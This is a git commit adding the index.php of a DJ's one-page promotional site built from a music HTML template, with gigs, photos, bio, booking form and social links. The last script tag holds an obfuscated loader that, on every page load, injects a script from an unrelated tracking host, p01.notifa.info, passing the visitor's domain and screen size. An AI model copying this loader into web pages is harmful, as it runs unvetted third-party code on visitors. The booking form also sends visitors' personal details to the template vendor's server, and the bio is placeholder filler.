69945a7c5f485ff0ba56310c6a39e9ae9392e442
alxjeff182 <45297442+alxjeff182@users.noreply.github.com>
2019-02-16 18:42:20 +0700

    Start

---
+++ index.php
@@ -0,0 +1,253 @@
+<!doctype html>
+<html class="no-js" lang="en">
+
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>I'm DJ Double-G</title>
+<meta name="description" content="The Incredible Music HTML Template">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<link href='https://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>
+<link href='components/slick/slick.css' rel='stylesheet' type='text/css'>
+<link href='components/swipebox/src/css/swipebox.min.css' rel='stylesheet' type='text/css'>
+<link href='fonts/iconfont/style.css' rel='stylesheet' type='text/css'>
+<link href='fonts/qticons/qticons.css' rel='stylesheet' type='text/css'>
+<link rel="stylesheet" href="css/qt-main.css">
+<link rel="shortcut icon" type="image/png" href="images/favicon.png" />
+</head>
+<body class="qt-debug-disabled">
+
+
+<header id="home" class="qt-header parallax-container scrollspy">
+<div class="parallax" data-start="width:100%;height:100%;top: 0%;left: 0%;" data-end="width:260%;height:260%;top:-80%;left:-80%;"><img src="images/galaxy-1.jpg" alt="background" style="opacity: 0.5; "></div>
+<div class="qt-valign-wrapper">
+<div class="qt-valign">
+<div class="container center-align" data-50p-top="opacity:1;margin-top:0px" data-30p-top="opacity:1;" data-0p-top="opacity:0;margin-top:-700px">
+<img src="images/logo.png" class="logo" alt="I'm DJ Double-G">
+<h4>DJ & PRODUCER</h4>
+</div>
+</div>
+</div>
+<div class="qt-particles" id="particlesheader" data-color="#ffffff" data-opacity="0.5" data-speed="1"></div>
+</header>
+
+
+<div id="menu" class="qt-menu-wrapper" data-0-top>
+<nav id="stickymenu" class="qt-menu grey-text text-lighten-4">
+
+<ul class="qt-desktopmenu">
+<li><a href="#home" class="qwsmoothscroll">Home</a></li>
+<li><a href="#music" class="qwsmoothscroll">Gigs</a></li>
+<li><a href="#photos" class="qwsmoothscroll">Photos</a></li>
+<li><a href="#bio" class="qwsmoothscroll">Bio</a></li>
+<li><a href="#booking" class="qwsmoothscroll">Booking</a></li>
+<li><a href="#presskit" class="qwsmoothscroll">Presskit</a></li>
+<li><a href="#video" class="qwsmoothscroll">Video</a></li>
+</ul>
+
+<ul id="slide-out" class="side-nav qt-mobilemenu">
+<li><a href="#home" class="qwsmoothscroll">Home</a></li>
+<li><a href="#music" class="qwsmoothscroll">Gigs</a></li>
+<li><a href="#photos" class="qwsmoothscroll">Photos</a></li>
+<li><a href="#bio" class="qwsmoothscroll">Bio</a></li>
+<li><a href="#booking" class="qwsmoothscroll">Booking</a></li>
+<li><a href="#presskit" class="qwsmoothscroll">Presskit</a></li>
+<li><a href="#video" class="qwsmoothscroll">Video</a></li>
+</ul>
+<a href="#" data-activates="slide-out" class="button-collapse qt-menu-switch"><span class="lnr lnr-menu"></span></a>
+</nav>
+</div>
+
+
+<main class="qt-main">
+
+<div id="music" class="section section-music parallax-container scrollspy">
+<div class="parallax"><img src="images/parallax3.jpg" alt="background">
+</div>
+<h2 class="qt-section-title" data-100p-top="opacity:0;" data-80p-top="opacity:0;" data-50p-top="opacity:1;" data-30p-top="opacity:1;" data-8p-top="opacity:1;" data-0p-top="opacity:0;">GIGS<i class="deco"></i></h2>
+<div id="carouselmusic" class="qt-gridstackCarousel-container">
+
+<div class="carousel qt-gridstackCarousel" data-vpadding="50" data-time_constant="500" data-dist="-30" data-shift="-20" data-padding="20" data-full_width="0" data-100p-top="opacity:0;" data-80p-top="opacity:0;" data-50p-top="opacity:1;" data-30p-top="opacity:1;" data-top-bottom="opacity:0;">
+<div class="carousel-item">
+<iframe width="100%" height="300" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/245219014&color=%23ff5500&auto_play=false&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true&visual=true"></iframe>
+<h5>Cobra is animal </h5>
+</div>
+<div class="carousel-item">
+<iframe width="100%" height="300" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/251483780&color=%23ff5500&auto_play=false&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true&visual=true"></iframe>
+<h5>Pulsation</h5>
+</div>
+<div class="carousel-item">
+<iframe width="100%" height="300" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/295471309&color=%23ff5500&auto_play=false&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true&visual=true"></iframe>
+<h5>Pulsation pt.2</h5>
+</div>
+</div>
+
+
+<div class="nav hide-on-med-and-down">
+<a class="prev" href="#">
+<span class="lnr lnr-arrow-left-circle"></span>
+</a>
+<a class="next" href="#">
+<span class="lnr lnr-arrow-right-circle"></span>
+</a>
+</div>
+
+</div>
+</div>
+
+
+<div id="modal1" class="modal bottom-sheet">
+<div class="modal-content">
+<iframe id="modalframe" class="qt-modalframe" src="#"></iframe>
+</div>
+</div>
+
+
+<div id="photos" class="section section-photos black scrollspy">
+<h2 class="qt-section-title" data-100p-top="opacity:0;" data-80p-top="opacity:0;" data-50p-top="opacity:1;">PHOTOS<i class="deco"></i></h2>
+<div class="qtgallery" data-bottom-top="opacity:0;" data-center-top="opacity:1;">
+<div><img src="images/gallery1.jpg" alt="photo" /></div>
+<div><img src="images/gallery2.jpg" alt="photo" /></div>
+<div><img src="images/gallery3.jpg" alt="photo" /></div>
+<div><img src="images/gallery4.jpg" alt="photo" /></div>
+<div><img src="images/gallery5.jpg" alt="photo" /></div>
+</div>
+</div>
+
+
+<div id="bio" class="section section-bio parallax-container qt-fullscreen scrollspy">
+<div class="parallax"><img src="images/bio.jpg" alt="background"></div>
+<div class="container">
+<div class="qt-framed flow-text" data-100p-top="opacity:0;" data-80p-top="opacity:0;" data-30p-top="opacity:1;">
+<h2 class="qt-section-title">BIO<i class="deco"></i></h2>
+<div class="content qt-polydecor poly2">
+<h4>Career</h4>
+One common flaw we've seen in many frameworks is a lack of support for truly responsive text. While elements on the page resize fluidly, text still resizes on a fixed basis. To ameliorate this problem, for text heavy pages, we've created a class that fluidly scales text size and line-height to optimize readability for the user. Line length stays between 45-80 characters and line height scales to be larger on smaller screens.
+To see Flow Text in action, slowly resize your browser and watch the size of this text body change! Use the button above to toggle off/on flow-text to see the difference!
+</div>
+</div>
+</div>
+</div>
+
+
+<div id="booking" class="section section-booking qt-fullscreen scrollspy  qt-polydecor poly3">
+<div class="qt-valign-wrapper">
+<div class="qt-valign flow-text">
+<h2 class="qt-section-title" data-100p-top="opacity:0;" data-80p-top="opacity:0;" data-30p-top="opacity:1;">BOOKING<i class="deco"></i></h2>
+<div class="qt-booking-form">
+<ul class="tabs">
+<li class="tab col s6"><h5><a href="#form" class="active">Booking form</a></h5></li>
+<li class="tab col s6"><h5><a href="#contacts">Contacts</a></h5></li>
+</ul>
+<div id="form" class="row">
+<form class="col s12" method="post" action="http://qantumthemes.xyz/sonikhtml/email_sender.php">
+<input type="hidden" name="antispam" value="x123">
+<div class="row">
+<div class="input-field col s6">
+<input name="first_name" id="first_name" type="text" class="validate">
+<label for="first_name">First Name</label>
+</div>
+<div class="input-field col s6">
+<input name="last_name" id="last_name" type="text" class="validate">
+<label for="last_name">Last Name</label>
+</div>
+</div>
+<div class="row">
+<div class="input-field col s12">
+<input name="email" id="email" type="email" class="validate">
+<label for="email">Email</label>
+</div>
+</div>
+<div class="row">
+<div class="input-field col s12">
+<textarea name="message" id="message" class="materialize-textarea" maxlength="300"></textarea>
+<label for="message">Message</label>
+</div>
+</div>
+<div class="row">
+<div class="input-field col s12">
+<p><button class="btn waves-effect waves-light" type="submit" name="action">
+<span class="lnr lnr-rocket"></span> Submit
+</button></p>
+</div>
+</div>
+</form>
+</div>
+<div id="contacts" class="row qt-contacts">
+<div class="col s12">
+<h4 class="center-align">Our contacts</h4>
+<p><span class="lnr lnr-smartphone"></span><span>+44 443 53 2324</span></p>
+<p><span class="lnr lnr-pencil"></span><span><a href="http://qantumthemes.xyz/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="0d64636b624d6f626266606863627a236e6260">[email&#160;protected]</a></span></p>
+<p><span class="lnr lnr-location"></span><span>Road Avenue, California</span></p>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+
+<div id="presskit" class="section section-presskit parallax-container scrollspy">
+<div class="parallax"><img src="images/galaxy-2.jpg" alt="background"></div>
+<div class="qt-polydecor poly4">
+<div class="container">
+<div class="qt-framed center-align" data-100p-top="opacity:0;" data-80p-top="opacity:0;" data-30p-top="opacity:1;">
+<h2 class="qt-section-title">PRESSKIT<i class="deco"></i></h2>
+<h4 class="center-align">You can download my official presskit here:</h4>
+<p class="center-align">
+<a class="btn waves-effect waves-light btn-large" href="downloads/presskit.html" target="_blank">DOWNLOAD</a>
+</p>
+</div>
+</div>
+</div>
+<div class="qt-particles" id="particlesbio" data-color="#ffffff" data-opacity="0.9" data-speed="1"></div>
+</div>
+
+
+<div id="video" class="section section-video  scrollspy">
+<div class="qt-framed flow-text" data-100p-top="opacity:0;" data-80p-top="opacity:0;" data-30p-top="opacity:1;">
+<h2 class="qt-section-title">VIDEOS<i class="deco"></i></h2>
+<div class="content">
+<div class="qtvideos">
+<div><a href="https://www.youtube.com/watch?v=U2AU2BJe8r0" class="swipebox"><img src="images/video1.jpg" alt="video"><span class="lnr lnr-film-play"></span></a><h5>DG Production At O2 Club Jakarta</h5></div>
+</div>
+</div>
+</div>
+</div>
+
+</main>
+
+
+
+<footer class="qt-footer parallax-container blue-grey-text text-lighten-5">
+<div class="parallax"><img src="images/galaxy-3.jpg" alt="background"></div>
+<div class="container center-align">
+<h3 class="qt-footertitle"><img src="images/logo-footer.png" alt="I'm DJ Double-G"></h3>
+<h5>Copyright 2018 <a href="">GeraldoGracedo9@gmail.com</a></h5>
+<p class="qt-social">
+<a href="https://www.instagram.com/geraldogst09"><span class="qticon-instagram"></span></a>
+<a href="https://www.facebook.com/geraldo.sudena"><span class="qticon-facebook"></span></a>
+<a href="https://twitter.com/DJ_MEKSS"><span class="qticon-twitter"></span></a>
+<a href="https://www.youtube.com/channel/UC44ckFbfZfdhMzEIfQO7oOg"><span class="qticon-youtube"></span></a>
+<a href="https://soundcloud.com/djdouble-g-1"><span class="qticon-soundcloud"></span></a>
+</p>
+</div>
+<div class="qt-particles" id="particlesfooter" data-color="#ffffff" data-opacity="0.2" data-speed="1"></div>
+</footer>
+
+
+
+<script data-cfasync="false" src="js/email-decode.min.js"></script><script src="js/modernizr-custom.js" type="8c4204d768a177b0b8ddf325-text/javascript"></script>
+<script src="js/jquery.js" type="8c4204d768a177b0b8ddf325-text/javascript"></script>
+<script src="js/jquery-migrate.min.js" type="8c4204d768a177b0b8ddf325-text/javascript"></script>
+
+<script src="js/materializecss/bin/materialize.min.js" type="8c4204d768a177b0b8ddf325-text/javascript"></script>
+<script src="components/slick/slick.min.js" type="8c4204d768a177b0b8ddf325-text/javascript"></script>
+<script src="components/particles/particles.min.js" type="8c4204d768a177b0b8ddf325-text/javascript"></script>
+<script src="components/skrollr/skrollr.min.js" type="8c4204d768a177b0b8ddf325-text/javascript"></script>
+<script src="components/swipebox/lib/ios-orientationchange-fix.js" type="8c4204d768a177b0b8ddf325-text/javascript"></script>
+<script src="components/swipebox/src/js/jquery.swipebox.min.js" type="8c4204d768a177b0b8ddf325-text/javascript"></script>
+
+<script src="js/qt-main.js" type="8c4204d768a177b0b8ddf325-text/javascript"></script>
+<script src="js/rocket-loader.min.js" data-cf-nonce="8c4204d768a177b0b8ddf325-" defer=""></script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bde9W89QzzwFZG1HeVjoMiYYu8SiPqNMlpcWzC%2fU205U3w25vc74O29VkPIDgyAOCJVqSYClo8cSn4wKfaZfbKTKcWp%2f3Gb0zYE9mtskYsBs0bacSCISKHf9DSHJ0%2bVJ8S76mSrPLbF%2bAz0SdLuu3Ns7wAjaL0c%2fIojtV%2fuayTemM7b3DfbgndSjX3qta14HoXuS0AZo3SyP8GteMoBylLnmHF5kFPMErAthhlMqhIqExCHKEDcJCp5%2bLMSR%2bqiN93GJNMvwUkIpOW4gWeQ4v9bb4R9Ff4chf%2bTlETHUhnRccWbXEvpJ9r1OZl%2bj4Rki2S%2f49ulnU4RFGliZx%2f3wOi%2faEGenEJrXGTH%2fB0AnsrQNttkyBYujbnq1jyVfB0yNDR0U1hs8mxY5WZo12T4C2V4Dyo5onFwlQXkja%2f5x7UekSXXLs0ni9ZKjj%2bMhjJarQoPuUC3i9j4iW4JERTn1oYvA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
